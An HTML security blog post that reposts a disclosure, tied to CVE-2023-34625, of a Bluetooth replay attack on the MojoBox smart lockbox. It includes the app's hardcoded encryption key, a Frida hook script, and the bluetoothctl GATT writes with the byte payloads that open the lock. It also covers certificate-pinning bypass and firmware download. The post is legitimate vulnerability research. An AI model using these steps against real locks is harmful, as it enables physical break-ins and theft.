<!DOCTYPE html>
<html lang="en">


<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?">
  

  

  <title>MojoBox - yet another not so smartlock</title>

  
  <meta name="author" content="Matteo Mandolini">
  

  <meta name="description" content="Note: This blogpost was originally posted on whid.ninja by Luca and me. Reposting here to add it to my portfolio. Authors: Matteo Mandolini &amp;amp; Luca Bongiorni Recently Luca came across MojoBox which is a “digital lockbox focused on smart access”. On February 26th a vulnerability was reported by LockPickingLawyer showing...">

  

  

  
  <link rel="alternate" type="application/rss+xml" title="Home" href="https://mandomat.github.io/feed.xml">
  

  

  

  

  


  
    
      
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">


    
      
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">


    
  

  
    
      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
    
      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
    
  

  

  
  
  

  

  
  <meta property="og:site_name" content="Home">
  <meta property="og:title" content="MojoBox - yet another not so smartlock">
  <meta property="og:description" content="Note: This blogpost was originally posted on whid.ninja by Luca and me. Reposting here to add it to my portfolio. Authors: Matteo Mandolini &amp;amp; Luca Bongiorni Recently Luca came across MojoBox which is a “digital lockbox focused on smart access”. On February 26th a vulnerability was reported by LockPickingLawyer showing...">

  
  <meta property="og:image" content="https://mandomat.github.io/assets/img/2023-03-15/2023-03-15-opens.gif">
  

  
  <meta property="og:type" content="article">
  <meta property="og:article:author" content="Matteo Mandolini">
  <meta property="og:article:published_time" content="2023-03-15T00:00:00-04:00">
  <meta property="og:url" content="https://mandomat.github.io/2023-03-15-testing-mojobox-security/">
  <link rel="canonical" href="https://mandomat.github.io/2023-03-15-testing-mojobox-security/">
  

  
  <meta name="twitter:card" content="summary_large_image">
  
  <meta name="twitter:site" content="@">
  <meta name="twitter:creator" content="@">

  <meta property="twitter:title" content="MojoBox - yet another not so smartlock">
  <meta property="twitter:description" content="Note: This blogpost was originally posted on whid.ninja by Luca and me. Reposting here to add it to my portfolio. Authors: Matteo Mandolini &amp;amp; Luca Bongiorni Recently Luca came across MojoBox which is a “digital lockbox focused on smart access”. On February 26th a vulnerability was reported by LockPickingLawyer showing...">

  
  <meta name="twitter:image" content="https://mandomat.github.io/assets/img/2023-03-15/2023-03-15-opens.gif">
  

  


  

  

</head>


<body>

  


  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="https://mandomat.github.io/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="main-navbar">
    <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/aboutme">About Me</a>
          </li>
        <li class="nav-item">
          <a class="nav-link" id="nav-search-link" href="#" title="Search">
            <span id="nav-search-icon" class="fa fa-search"></span>
            <span id="nav-search-text">Search</span>
          </a>
        </li></ul>
  </div>

  

  
    <div class="avatar-container">
      <div class="avatar-img-border">
        <a href="https://mandomat.github.io/">
          <img alt="Navigation bar avatar" class="avatar-img" src="/assets/img/avatar-icon.png" />
        </a>
      </div>
    </div>
  

</nav>



<div id="beautifuljekyll-search-overlay">

  <div id="nav-search-exit" title="Exit search">✕</div>
  <input type="text" id="nav-search-input" placeholder="Search">
  <ul id="search-results-container"></ul>
  
  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
  <script>
    var searchjson = '[ \
       \
        { \
          "title"    : "Denial of Pleasure", \
          "category" : "hackingblebluetoothflipperzero", \
          "url"      : "/2023-11-13-denial-of-pleasure/", \
          "date"     : "November 13, 2023" \
        }, \
       \
        { \
          "title"    : "Using silent SMS to localize LTE users", \
          "category" : "telcoSDRUSRPLTEsniffersilentSMS", \
          "url"      : "/2023-09-21-localization-with-silent-SMS/", \
          "date"     : "September 21, 2023" \
        }, \
       \
        { \
          "title"    : "Route to RCE - Dissecting a cheap WiFi repeater", \
          "category" : "hackingRCEwifirepeaterhardwarefirmwareghidra", \
          "url"      : "/2023-04-13-testing-a-cheap-wifi-repeater/", \
          "date"     : "April 13, 2023" \
        }, \
       \
        { \
          "title"    : "MojoBox - yet another not so smartlock", \
          "category" : "hackingblebluetoothphysecappsec", \
          "url"      : "/2023-03-15-testing-mojobox-security/", \
          "date"     : "March 15, 2023" \
        }, \
       \
       \
        { \
          "title"    : "About me", \
          "category" : "page", \
          "url"      : "/aboutme/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Home", \
          "category" : "page", \
          "url"      : "/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Tag Index", \
          "category" : "page", \
          "url"      : "/tags/", \
          "date"     : "January 1, 1970" \
        } \
       \
    ]';
    searchjson = JSON.parse(searchjson);

    var sjs = SimpleJekyllSearch({
      searchInput: document.getElementById('nav-search-input'),
      resultsContainer: document.getElementById('search-results-container'),
      json: searchjson
    });
  </script>
</div>





  <!-- TODO this file has become a mess, refactor it -->







<header class="header-section ">

<div class="intro-header no-img">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>MojoBox - yet another not so smartlock</h1>
          

          
            <span class="post-meta">Posted on March 15, 2023</span>
            
            
          
        </div>
      </div>
    </div>
  </div>
</div>
</header>





<div class=" container-md ">
  <div class="row">
    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">

      

      

      <article role="main" class="blog-post">
        <p class="box-note"><strong>Note:</strong> This blogpost was originally posted on <a href="https://www.whid.ninja/blog/mojobox-yet-another-not-so-smartlock">whid.ninja</a> by Luca and me. Reposting here to add it to my portfolio.</p>

<p><strong>Authors</strong>: Matteo Mandolini &amp; Luca Bongiorni</p>

<p>Recently Luca came across <a href="https://www.mojolock.com/">MojoBox</a> which is a <em>“digital lockbox focused on smart access”</em>. On February 26th a vulnerability was reported by LockPickingLawyer showing how this lockbox could be easily opened with a slap! The demo <a href="https://www.youtube.com/watch?v=k3bS1oLEbIM">video</a> is avilable on his Youtube Channel. This vulnerability was promptly fixed by the company and a firmware upgrade was already available the day after the video was released.</p>

<p>This whole situation alerted the spidey sense of Luca, who immediately obtained the device with the intention of performing further analysis. Before testing the hardware part, he passed it to me (Matteo) to investigate the attack surface related to the mobile application and the Bluetooth Low Energy functions.</p>

<p>It turns out Luca’s senses were right, MojoBox is vulnerable to <strong>reply attack</strong> via BLE: this means we can sniff the BLE traffic, steal the packets information and replicate them to have access to the box. Moreover, the app suffers from issues like hardcoded credentials, unobfuscated code and others.</p>

<h2 id="intercepting-ble-requests-with-frida">Intercepting BLE requests with Frida</h2>

<p>First step, I decided to use Frida to monitor the type of information that was being sent when the lockbox was opened through the Android app.
To do this, I used <a href="https://github.com/optiv/blemon">blemon</a>, a useful Frida script for hooking any overridden instance methods of the android.bluetooth.BluetoothGattCallback class.</p>

<p>With the Frida server up and running on my rooted Android device, I just had to execute the following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frida -U -l blemon.js "MojoLock"
</code></pre></div></div>

<p>Upon clicking two times the “Open” button on the app, I obtained the following result:</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-frida-result.png" alt="FridaResultBlemon" class="mx-auto d-block" /></p>

<p>At this point, it was clear that the exchanged packets were undergoing some type of encryption and most likely could not be reused (and I was wrong). This discovery prompted me to continue analyzing the APK in search of an encryption function to exploit.</p>

<h2 id="apk-static-analysys">APK static analysys</h2>

<p>For the static analysis part, I started by downloading the APK from my device using adb. It’s convenient to take note of the app package reference found in the Google Play Store URL to easily locate the APK in the phone’s file-system. Once the package name is found, you can simply execute the following commands to obtain the APK:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb shell pm path com.mojolock.app
adb pull &lt;result_of_previous_command&gt;
</code></pre></div></div>

<p>Once the APK is obtained, we decompile it as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apktool d mojolock.apk
</code></pre></div></div>

<p>and begin inspecting the code using jadx-gui. The cool thing is that at this point we already know where to look, infact blemon told us that the BluetoothGattCallback was called from <em>com.reactlibraryzealinglock.controllers.ZealingController</em></p>

<p>The app is <strong>not obfuscated</strong> and the code is really easy to read, infact we can see that ZealingController is using <em>com.reactlibraryzealinglock.controllers.utils.TeaUtil</em> as a utility class. This class contains the encryption key,</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span><span class="o">[]</span> <span class="no">KEY</span> <span class="o">=</span> <span class="o">{-</span><span class="mi">2062458830</span><span class="o">,</span> <span class="mi">1377052040</span><span class="o">,</span> <span class="mi">910521121</span><span class="o">,</span> <span class="o">-</span><span class="mi">1792593385</span><span class="o">};</span>
</code></pre></div></div>

<p>the <em>openLock</em> and <em>encrypt</em> function. We have almost everything we need to build our own app to generate legit packets, know we only need the input of the <em>openLock</em> function.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-openlock.png" alt="OpenLockFunc" class="mx-auto d-block" /></p>

<p>For this task Frida will help us again, with the following script I could intercept the <em>openLock</em> inputs:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Java</span><span class="o">.</span><span class="na">perform</span><span class="o">(</span><span class="n">function</span><span class="o">()</span> <span class="o">{</span>
    <span class="kt">var</span> <span class="nc">TeaUtil</span> <span class="o">=</span> <span class="nc">Java</span><span class="o">.</span><span class="na">use</span><span class="o">(</span><span class="s">"com.reactlibraryzealinglock.controllers.utils.TeaUtil"</span><span class="o">);</span>

    <span class="nc">TeaUtil</span><span class="o">.</span><span class="na">openLock</span><span class="o">.</span><span class="na">implementation</span> <span class="o">=</span> <span class="n">function</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="n">z</span><span class="o">,</span> <span class="n">str2</span><span class="o">,</span> <span class="n">b</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">console</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="s">"openLock input: str="</span> <span class="o">+</span> <span class="n">str</span> <span class="o">+</span> <span class="s">", z="</span> <span class="o">+</span> <span class="n">z</span> <span class="o">+</span> <span class="s">", str2="</span> <span class="o">+</span> <span class="n">str2</span> <span class="o">+</span> <span class="s">", b="</span> <span class="o">+</span> <span class="n">b</span><span class="o">);</span>

        <span class="kt">var</span> <span class="n">result</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">openLock</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="n">z</span><span class="o">,</span> <span class="n">str2</span><span class="o">,</span> <span class="n">b</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">});</span>
</code></pre></div></div>

<p>obtaining the following result:</p>

<p><strong>openLock input: str=unknown_MAC_address_redacted, z=true, str2=1678565356261, b=1</strong></p>

<p>as we can see the <em>str</em> parameter is an (at the moment) unknown MAC address, <em>z</em> and <em>b</em> are fixed and <em>str2</em> is the current epoch time. Everything suggested that the package was indeed dependent on the epoch time and could not be reused at later points in time after the first use (wrong assumption again).</p>

<p>At this point, I had everything I needed to reconstruct, through a Java app, the encrypted packets that would send the signal to open the MojoBox. To do this, I reused all the code from the application and imported the same libraries used by the app into my new project. Except for the <em>android.text.format.Time</em> which was replaced by <em>java.time.LocalDateTime</em>, which required some minor modifications to the way information on the date was derived from the epoch time.</p>

<p>The result seemed ok, but I needed some more understanding of how the packet needed to be sent to the MojoBox. It was time to dig deeper.</p>

<h2 id="sniffing-ble-packets-with-nrf52840-dongle">Sniffing BLE packets with nRF52840 dongle</h2>

<p>At <a href="https://infocenter.nordicsemi.com/index.jsp?topic=%2Fug_sniffer_ble%2FUG%2Fsniffer_ble%2Fintro.html">this</a> link you can find all the information needed to install the nRF Sniffer software on the nRF52840 dongle. Once up and running, we can start seeing BLE packets going around in Wireshark.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-wireshark.png" alt="WireShark" class="mx-auto d-block" /></p>

<p>These two great tools show us something really interesting: as we can see from the screenshot above, after all the GATT discovery process, <strong>the original app sends a <em>Write Request</em> on handle <em>0x0011</em> and only after that it sends a <em>Write Command</em> on handle <em>0x000e</em> containing the actual payload</strong>. We need to replicate this behaviour to interact with the MojoBox</p>

<h2 id="cracking-open-the-mojobox-over-ble">Cracking Open the MojoBox over BLE</h2>

<p>For this step I used my RaspberryPi and <strong>bluetoothctl</strong> as a BLE client.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bluetoothctl
[bluetooth]# scan on
[NEW] Device DF:10:10:02:35:16 MojoBox-023516
[bluetooth]# scan off
Discovery stopped
[bluetooth]# connect DF:10:10:02:35:16
</code></pre></div></div>

<p>at this point the tool gives us the list of characteristics but, from our privious investigations, we know that we are interested in just two of them:</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-characteristics.png" alt="Characteristics" class="mx-auto d-block" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[MojoBox-023516]# gatt.select-attribute ff02
[MojoBox-023516:/service000c/char000f]# gatt.notify on
[CHG] Attribute /org/bluez/hci0/dev_DF_10_10_02_35_16/service000c/char000f Notifying: yes
Notify started
</code></pre></div></div>

<p>Now we generate a new valid encrypted packet with our Java application and send it to the MojoBox. Note that we have to split the command in two requests, the first one is 20 Bytes and the second one is 9Bytes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
[MojoBox-023516:/service000c/char000d]# gatt.write "0x68 0x01 0x18 0x28 0xFC 0x08 0xE5 0xB9 0xDA 0xDB 0xCE 0x21 0x62 0x1B 0x2A 0xF9 0xBE 0xFB 0x1E 0xE9"
Attempting to write /org/bluez/hci0/dev_DF_10_10_02_35_16/service000c/char000d
[MojoBox-023516:/service000c/char000d]# gatt.write "0xA0 0x13 0xEE 0x11 0x94 0x31 0x7D 0xDB 0x16"
Attempting to write /org/bluez/hci0/dev_DF_10_10_02_35_16/service000c/char000d
</code></pre></div></div>

<p><strong>And voilà, the lock opens!</strong></p>

<p><img src="/assets/img/2023-03-15/2023-03-15-opens.gif" alt="Opens" class="mx-auto d-block" /></p>

<p>That’s not it! We can also send the same packet multiple times, <strong>confirming that MojoBox is vulnerable to replay attack</strong>. The oldest valid packet I tried is almost one week old and still does its job!</p>

<h2 id="downloading-mojolock-firmware-for-future-analysis">Downloading MojoLock firmware for future analysis</h2>

<p>In the resources folder of the decompiled APK we can find the file <em>index.bundle.android</em>, a file generated by React Native, a framework for developing cross-platform mobile applications using JavaScript and React. This file contains the JavaScript source code of the mobile app along with the information for downloading the firmware file for the firmware upgrade of MojoBox.</p>

<p>Specifically we are interested in the following function:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nx">asyncGetFirmwareFile</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">o</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="k">async</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for</span> <span class="p">(;;)</span> <span class="k">switch</span> <span class="p">(</span><span class="nx">n</span><span class="p">.</span><span class="nx">prev</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
                        <span class="k">return</span> <span class="nx">n</span><span class="p">.</span><span class="nx">abrupt</span><span class="p">(</span><span class="dl">"</span><span class="s2">return</span><span class="dl">"</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                            <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">environment</span><span class="p">,</span>
                                <span class="nx">o</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">email</span><span class="p">,</span>
                                <span class="nx">c</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">authToken</span><span class="p">,</span>
                                <span class="nx">l</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">lockId</span><span class="p">;</span>
                            <span class="k">return</span> <span class="nx">t</span><span class="p">.</span><span class="nx">RNFetchBlob</span><span class="p">.</span><span class="nx">config</span><span class="p">({</span>
                                <span class="na">fileCache</span><span class="p">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                                <span class="na">timeout</span><span class="p">:</span> <span class="mi">3</span><span class="nx">e4</span>
                            <span class="p">}).</span><span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">getApiURL</span><span class="p">)(</span><span class="nx">s</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/api/mv1/lockboxes/firmware_upgrade_file?user_email=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;user_token=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">l</span><span class="p">),</span> <span class="p">{}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nx">n</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span>
                            <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nx">n</span><span class="p">({</span>
                                    <span class="na">statusCode</span><span class="p">:</span> <span class="nx">s</span><span class="p">,</span>
                                    <span class="na">errorMessage</span><span class="p">:</span> <span class="nx">t</span>
                                <span class="p">})</span>
                            <span class="p">})</span>
                        <span class="p">}));</span>
                    <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="k">case</span> <span class="dl">"</span><span class="s2">end</span><span class="dl">"</span><span class="p">:</span>
                        <span class="k">return</span> <span class="nx">n</span><span class="p">.</span><span class="nx">stop</span><span class="p">()</span>
                <span class="p">}</span>
            <span class="p">})</span>
        <span class="p">},</span>

</code></pre></div></div>
<p>we just need some values to download the firmware: <em>user_email</em> (the same we use for log in) and <em>user_token</em> &amp; <em>user_token</em> that we still have to find.
Let’s bypass the certificate pinning with Frida and intercept some requests with BurpSuite to find the missing parameters. I used <a href="https://raw.githubusercontent.com/httptoolkit/frida-android-unpinning/main/frida-script.js">this</a> Frida script for certificate unpinning.</p>

<p>One of the first requests made by the app already gives us what we’re looking for:</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-burp.png" alt="Burp" class="mx-auto d-block" /></p>

<p><strong>with <em>auid</em> being the uknown mac address we found as the input for the <em>openLock</em> function. This means that we cannot create new valid encrypted packets without knowing this information, which obviously will be different for every device.</strong></p>

<p>At this point we can write a simple python script to download the firmware</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s">"mojobox_firmware.bin"</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://showmojo.com/api/mv1/lockboxes/firmware_upgrade_file?user_email=&lt;email&gt;&amp;user_token=&lt;token&gt;&amp;id=&lt;id&gt;"</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>

</code></pre></div></div>

<p>From a first look at the firmware not much can be said, however finding strings like the one in the image below, which refers to a UART interface, bodes well for further hardware analysis.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-ghidra.png" alt="Ghidra" class="mx-auto d-block" /></p>

<p>Future work: it would be interesting to further investigate the firmware especially to reverse engineer the decryption functions and to understand how the temporary codes (requested by the mobile app, generated by the server and accepted by MojoBox) are handled.</p>

<h2 id="bonus-chapter--no-need-to-sniff">Bonus chapter – No need to sniff</h2>

<p>The mobile app contains multiple debugging messages as we can see from the image below</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-debuggingmessages.png" alt="DebuggingMessages" class="mx-auto d-block" /></p>

<p>This means that if an attacker has physical access to the device where the app is installed, He/She can access the app logs via adb without being root.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-logcat.png" alt="LogCat" class="mx-auto d-block" /></p>

<p>As we already know the data we read after “WRITE SUCCESS” can be used to open the MojoBox as many times as we want.</p>

<p>Moreover, we could find username and password stored in an unencrypted SQLite database, which is not a good idea.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-sqlite.png" alt="SQLite" class="mx-auto d-block" /></p>

<p>As a final consideration, it seems that the <em>user_code</em> parameter, that we already saw being sent in a GET request while intercepting the requests with Burp, never changes and is the only parameter needed, along with the user email, to retrieve all users’ information. Sending such a critical information about the user through GET request should be obviously considered a bad practice.</p>

<h2 id="hardware-analysis">Hardware Analysis</h2>

<p>To analyze the MojoBox hardware from a security perspective, we first conducted some passive recon to realize what kind of components we would need to interact with. The information from the <a href="https://www.whid.ninja/blog/mojobox-yet-another-not-so-smartlock#:~:text=information%20from%20the-,FCC,-database%20gave%20us">FCC</a> database gave us an initial idea. We then opened the device and found the following chipset</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-chip.jpeg" alt="Chip" class="mx-auto d-block" /></p>

<p>It is from a company called Pixart and not very common. We found a similar one here https://www.pixart.com/products-detail/87/PAR2801QN-GHVC . As we can see from the table on this tech brochure,  the MCU can handle many peripherals interfaces:</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-peripherals.png" alt="Peripherals" class="mx-auto d-block" /></p>

<p>So we connected to the UART interface that we found on the PCB and then tried to intercept traffic using a Logic Analyzer.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-UART.png" alt="UART" class="mx-auto d-block" /></p>

<p>Turning off and on the and interacting with the device through the mobile app did not trigger the output of meaningful information as shown in the image below</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-logicanalyzer.png" alt="LogicAnalyzer" class="mx-auto d-block" /></p>

<p>At this point we started to analyze the EEPROM which uses the I2C protocol to communicate with the CPU. We unsoldered it from the PCB and used a CH341A chip to analyze its content.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-EEPROM.gif" alt="EEPROM" class="mx-auto d-block" /></p>

<p>Inside this memory flash we found what appears to be an access list with our pincode and all the temporary pincodes we used. Having this information in plain text is definitely not a best practice, however considering the difficulty to access the I2C flash (i.e. first need to open the lock and then unscrew the PCB from the case), it can be rated as a minor issue.</p>

<p><img src="/assets/img/2023-03-15/2023-03-15-EEPROM-content.jpeg" alt="EEPROMcontent" class="mx-auto d-block" /></p>

<h2 id="conclusions">Conclusions</h2>

<ul>
  <li>It is never a good idea to reinvent the wheel: The Security Manager (SM) and Generic Access Profile (GAP) levels of the BLE core specification specify rules and algorithms to allow secure connections.</li>
  <li>Always follow code best practices and code review</li>
  <li>Security is a process not a product, therefore it must be applied in each phase of the life cycle of a product.</li>
</ul>

<p>CVE-2023-34625 was assigned to the vulnerability reported in this post.</p>

<p><strong>Stay tuned for future works. Thank you!</strong></p>

      </article>

      
        <div class="blog-tags">
          <span>Tags:</span>
          
            <a href="/tags#hacking">hacking</a>
          
            <a href="/tags#ble">ble</a>
          
            <a href="/tags#bluetooth">bluetooth</a>
          
            <a href="/tags#physec">physec</a>
          
            <a href="/tags#appsec">appsec</a>
          
        </div>
      

      

      
        <!-- Check if any share-links are active -->




<section id = "social-share-section">
  <span class="sr-only">Share: </span>

  

  

  
    <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmandomat.github.io%2F2023-03-15-testing-mojobox-security%2F"
      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
      <span class="sr-only">LinkedIn</span>
    </a>
  

  

  

</section>



      

      <ul class="pagination blog-pager">
        
        
        <li class="page-item next">
          <a class="page-link" href="/2023-04-13-testing-a-cheap-wifi-repeater/" data-toggle="tooltip" data-placement="top" title="Route to RCE - Dissecting a cheap WiFi repeater">Next Post &rarr;</a>
        </li>
        
      </ul>
      
  
  
  

  


  

  



    </div>
  </div>
</div>


  <footer>
  <div class="container-md beautiful-jekyll-footer">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
    <a href="mailto:mat.mandolini@gmail.com" title="Email me">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Email me</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://github.com/mandomat" title="GitHub">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">GitHub</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://linkedin.com/in/matteo-mandolini-b0b040144" title="LinkedIn">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">LinkedIn</span>
   </a>
  </li></ul>

      
      <p class="copyright text-muted">
      
        Matteo Mandolini
        &nbsp;&bull;&nbsp;
      
      2023

      
        &nbsp;&bull;&nbsp;
        <span class="author-site">
          <a href="https://mandomat.github.io/">mandomat.github.io</a>
        </span>
      

      

      
        &nbsp;&bull;&nbsp;
        <a title="Edit this page on GitHub" href="https://github.com/mandomat/mandomat.github.io/edit/master/_posts/2023-03-15-testing-mojobox-security.md" class="text_muted">Edit page</a>
       

      </p>
      <p class="theme-by text-muted">
        Powered by
        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
      </p>
      </div>
    </div>
  </div>

</footer>


  
  
    
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>


  
    
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>


  
    
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>


  



  
    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
    
      <script src="/assets/js/beautifuljekyll.js"></script>
    
  









  <script type="text/javascript" src="/assets/js/lightbox.js"></script>
  <link rel="stylesheet" href="/assets/css/lightbox.css">
</body>
</html>
